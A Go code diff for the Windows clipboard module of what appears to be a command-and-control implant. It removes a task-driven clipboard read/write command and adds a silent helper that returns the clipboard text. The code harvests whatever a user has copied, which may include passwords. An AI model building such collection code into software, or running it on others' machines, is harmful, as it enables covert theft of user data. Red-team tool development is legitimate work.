@@ -4,7 +4,6 @@
 package commands
 
 import (
-	"encoding/json"
 	"fmt"
 	"syscall"
 	"unsafe"
@@ -33,54 +32,7 @@ const (
 	gmemMoveable  = 0x0002
 )
 
-type ClipboardCommand struct{}
-
-func (c *ClipboardCommand) Name() string {
-	return "clipboard"
-}
-
-func (c *ClipboardCommand) Description() string {
-	return "Read or write Windows clipboard contents"
-}
-
-type ClipboardParams struct {
-	Action string `json:"action"`
-	Data   string `json:"data"`
-}
-
-func (c *ClipboardCommand) Execute(task structs.Task) structs.CommandResult {
-	var params ClipboardParams
-	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	switch params.Action {
-	case "read":
-		return readClipboard()
-	case "write":
-		if params.Data == "" {
-			return structs.CommandResult{
-				Output:    "Error: 'data' parameter is required for write action",
-				Status:    "error",
-				Completed: true,
-			}
-		}
-		return writeClipboard(params.Data)
-	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s (use 'read' or 'write')", params.Action),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-}
-
 func readClipboard() structs.CommandResult {
-	// Open clipboard
 	ret, _, err := procOpenClipboard.Call(0)
 	if ret == 0 {
 		return structs.CommandResult{
@@ -91,8 +43,7 @@ func readClipboard() structs.CommandResult {
 	}
 	defer procCloseClipboard.Call()
 
-	// Get clipboard data as Unicode text
-	handle, _, err := procGetClipboardData.Call(cfUnicodeText)
+	handle, _, _ := procGetClipboardData.Call(cfUnicodeText)
 	if handle == 0 {
 		return structs.CommandResult{
 			Output:    "Clipboard is empty or does not contain text",
@@ -101,7 +52,6 @@ func readClipboard() structs.CommandResult {
 		}
 	}
 
-	// Lock the global memory to get a pointer
 	ptr, _, err := procGlobalLock.Call(handle)
 	if ptr == 0 {
 		return structs.CommandResult{
@@ -112,7 +62,6 @@ func readClipboard() structs.CommandResult {
 	}
 	defer procGlobalUnlock.Call(handle)
 
-	// Read the Unicode string
 	text := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptr)))
 
 	if text == "" {
@@ -131,7 +80,6 @@ func readClipboard() structs.CommandResult {
 }
 
 func writeClipboard(text string) structs.CommandResult {
-	// Convert to UTF-16
 	utf16Text, err := syscall.UTF16FromString(text)
 	if err != nil {
 		return structs.CommandResult{
@@ -141,10 +89,8 @@ func writeClipboard(text string) structs.CommandResult {
 		}
 	}
 
-	// Calculate size in bytes
 	size := len(utf16Text) * 2
 
-	// Allocate global memory
 	hMem, _, err := procGlobalAlloc.Call(gmemMoveable, uintptr(size))
 	if hMem == 0 {
 		return structs.CommandResult{
@@ -154,7 +100,6 @@ func writeClipboard(text string) structs.CommandResult {
 		}
 	}
 
-	// Lock the memory
 	ptr, _, err := procGlobalLock.Call(hMem)
 	if ptr == 0 {
 		procGlobalFree.Call(hMem)
@@ -165,7 +110,6 @@ func writeClipboard(text string) structs.CommandResult {
 		}
 	}
 
-	// Copy the UTF-16 data
 	src := unsafe.Pointer(&utf16Text[0])
 	dst := unsafe.Pointer(ptr)
 	copy(
@@ -175,7 +119,6 @@ func writeClipboard(text string) structs.CommandResult {
 
 	procGlobalUnlock.Call(hMem)
 
-	// Open clipboard
 	ret, _, err := procOpenClipboard.Call(0)
 	if ret == 0 {
 		procGlobalFree.Call(hMem)
@@ -187,11 +130,9 @@ func writeClipboard(text string) structs.CommandResult {
 	}
 	defer procCloseClipboard.Call()
 
-	// Empty the clipboard
 	procEmptyClipboard.Call()
 
-	// Set the clipboard data — on success, the system takes ownership of hMem.
-	// On failure, we must free it ourselves.
+	// On success, system takes ownership of hMem. On failure, we must free.
 	ret, _, err = procSetClipboardData.Call(cfUnicodeText, hMem)
 	if ret == 0 {
 		procGlobalFree.Call(hMem)
@@ -207,4 +148,25 @@ func writeClipboard(text string) structs.CommandResult {
 		Status:    "success",
 		Completed: true,
 	}
+}
+
+func clipReadText() string {
+	ret, _, _ := procOpenClipboard.Call(0)
+	if ret == 0 {
+		return ""
+	}
+	defer procCloseClipboard.Call()
+
+	handle, _, _ := procGetClipboardData.Call(cfUnicodeText)
+	if handle == 0 {
+		return ""
+	}
+
+	ptr, _, _ := procGlobalLock.Call(handle)
+	if ptr == 0 {
+		return ""
+	}
+	defer procGlobalUnlock.Call(handle)
+
+	return windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptr)))
 }
